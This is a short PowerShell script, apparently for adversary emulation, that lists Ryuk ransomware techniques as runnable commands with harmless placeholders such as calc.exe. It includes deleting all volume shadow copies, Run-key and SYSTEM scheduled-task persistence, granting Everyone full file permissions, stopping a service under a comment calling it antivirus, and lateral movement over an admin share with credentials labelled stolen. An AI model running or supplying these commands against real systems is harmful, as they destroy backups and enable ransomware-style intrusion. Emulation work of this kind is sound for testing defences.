# --- Ryuk Enterprise Layer Techniques in PowerShell ---

# Adjust token privileges
whoami /priv

# Registry Run key persistence
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Example" -Value "calc.exe" -PropertyType String

# Command execution
Start-Process cmd.exe -ArgumentList "/c echo Persistence established."

# File & Directory Enumeration
Get-ChildItem -Path C:\ -Recurse -Force | Out-Null

# Modify file permissions
icacls "C:\TestFolder" /grant Everyone:F /T /C /Q

# Stop AV services
Stop-Service -Name "wuauserv" -Force

# Delete shadow copies
vssadmin delete shadows /all /quiet

# Execute binaries
Start-Process notepad.exe

# List running processes
Get-Process

# Lateral movement via C$ share
New-PSDrive -Name X -PSProvider FileSystem -Root "\\TARGET-PC\C$" -Credential (Get-Credential)

# Create scheduled task
schtasks /create /tn "ExampleTask" /tr "calc.exe" /sc onstart /ru SYSTEM

# Stop processes
Stop-Process -Name "notepad" -Force

# Enumerate drives
Get-PSDrive -PSProvider FileSystem

# Check system locale
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Nls\Language" -Name InstallLanguage

# Get ARP table
Get-NetNeighbor | Format-Table

# Wake-on-LAN (requires module or external tool)
# Example: Send-Wol -MacAddress "00:11:22:33:44:55"

# Use stolen credentials for remote command\Invoke-Command -ComputerName TARGET-PC -Credential (Get-Credential) -ScriptBlock { Get-ChildItem C:\ }


# --- Ryuk ICS Layer Technique in PowerShell ---

# Simulated ERP system impact
Write-Output "[ICS Impact] ERP server unavailable, switching to manual process."
